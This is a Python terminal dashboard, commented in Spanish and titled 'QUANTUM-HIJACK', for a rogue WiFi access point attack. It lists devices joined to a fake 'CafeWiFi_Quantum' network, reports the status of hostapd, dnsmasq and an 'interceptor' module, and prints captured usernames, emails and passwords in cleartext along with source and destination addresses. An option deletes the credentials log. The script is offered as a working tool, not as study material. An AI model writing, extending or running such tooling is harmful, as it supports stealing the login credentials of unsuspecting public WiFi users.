#!/usr/bin/env python3
"""
QUANTUM-HIJACK DASHBOARD TERMINAL
Muestra en vivo: dispositivos conectados, credenciales, logs
"""

import time
import json
import os
import subprocess
from datetime import datetime
from pathlib import Path

def clear_screen():
    os.system('clear' if os.name != 'nt' else 'cls')

def read_json_file(filepath):
    """Lee archivo JSON de forma segura"""
    try:
        if os.path.exists(filepath):
            with open(filepath, 'r') as f:
                return json.load(f)
    except:
        pass
    return []

def get_connected_clients():
    """Obtiene dispositivos conectados al WiFi rogue"""
    try:
        result = subprocess.run(['iw', 'dev', 'wlan0mon', 'station', 'dump'], 
                              capture_output=True, text=True)
        clients = []
        for line in result.stdout.split('\n'):
            if 'Station' in line:
                mac = line.split('Station ')[1].split(' ')[0]
                clients.append({
                    'mac': mac,
                    'connected_at': datetime.now().strftime('%H:%M:%S')
                })
        return clients
    except:
        return []

def get_captured_credentials():
    """Lee credenciales capturadas"""
    return read_json_file('logs/captured_credentials.json')

def get_operation_logs():
    """Lee logs de operación"""
    return read_json_file('logs/operation_logs.json')

def draw_dashboard():
    """Dibuja el dashboard en terminal"""
    clear_screen()
    
    print("╔════════════════════════════════════════════════════════════════╗")
    print("║          🔓 QUANTUM-HIJACK DASHBOARD v2.0 - LIVE              ║")
    print("║                    Emmanuel 2026                               ║")
    print("╚════════════════════════════════════════════════════════════════╝")
    print("")
    
    # Timestamp
    print(f"⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("")
    
    # Estados de módulos
    print("📊 ESTADO DE MÓDULOS")
    print("─" * 65)
    print("  ✅ hostapd      [CafeWiFi_Quantum] en wlan0mon")
    print("  ✅ dnsmasq      [192.168.1.1] rango 2-100")
    print("  ✅ interceptor  [ACTIVO] monitorando puertos 21,22,80,443...")
    print("")
    
    # Clientes conectados
    clients = get_connected_clients()
    print(f"📱 CLIENTES CONECTADOS ({len(clients)})")
    print("─" * 65)
    if clients:
        for i, client in enumerate(clients[:5], 1):
            print(f"  {i}. 🔗 {client['mac']} @ {client['connected_at']}")
        if len(clients) > 5:
            print(f"  ... y {len(clients) - 5} más")
    else:
        print("  ⏳ Esperando conexiones...")
    print("")
    
    # Credenciales capturadas
    credentials = get_captured_credentials()
    print(f"🔥 CREDENCIALES CAPTURADAS ({len(credentials)})")
    print("─" * 65)
    if credentials:
        for cred in credentials[-3:]:  # Últimas 3
            print(f"  [{cred['timestamp']}] {cred['protocol']}")
            print(f"    👤 {cred['credentials'].get('username', cred['credentials'].get('email', 'N/A'))}")
            print(f"    🔐 {cred['credentials'].get('password', '*' * 8)}")
            print(f"    📍 {cred['src_ip']} → {cred['dst_ip']}:{cred['port']}")
            print("")
    else:
        print("  ⏳ Esperando capturar credenciales...")
    print("")
    
    # Resumen
    print("📈 RESUMEN SESIÓN")
    print("─" * 65)
    print(f"  Total clientes: {len(clients)}")
    print(f"  Credenciales: {len(credentials)}")
    print(f"  Uptime: [calculado]")
    print("")
    
    print("═" * 65)
    print("  Q = Quit | R = Refresh | L = Logs | C = Clear")
    print("═" * 65)

def main():
    """Loop principal"""
    try:
        while True:
            draw_dashboard()
            
            # Input no bloqueante
            try:
                cmd = input("\n➜ Comando: ").lower().strip()
                
                if cmd == 'q':
                    print("\n[!] Dashboard cerrado")
                    break
                elif cmd == 'r':
                    continue
                elif cmd == 'l':
                    print("\n📋 LOGS RECIENTES:")
                    logs = get_operation_logs()
                    for log in logs[-10:]:
                        print(f"  {log}")
                    input("\nPresiona Enter para volver...")
                elif cmd == 'c':
                    if os.path.exists('logs/captured_credentials.json'):
                        os.remove('logs/captured_credentials.json')
                        print("[✓] Credenciales borradas")
                        time.sleep(1)
                
            except EOFError:
                time.sleep(2)
                continue
                
    except KeyboardInterrupt:
        print("\n\n[!] Dashboard interrumpido")
        exit(0)

if __name__ == "__main__":
    main()
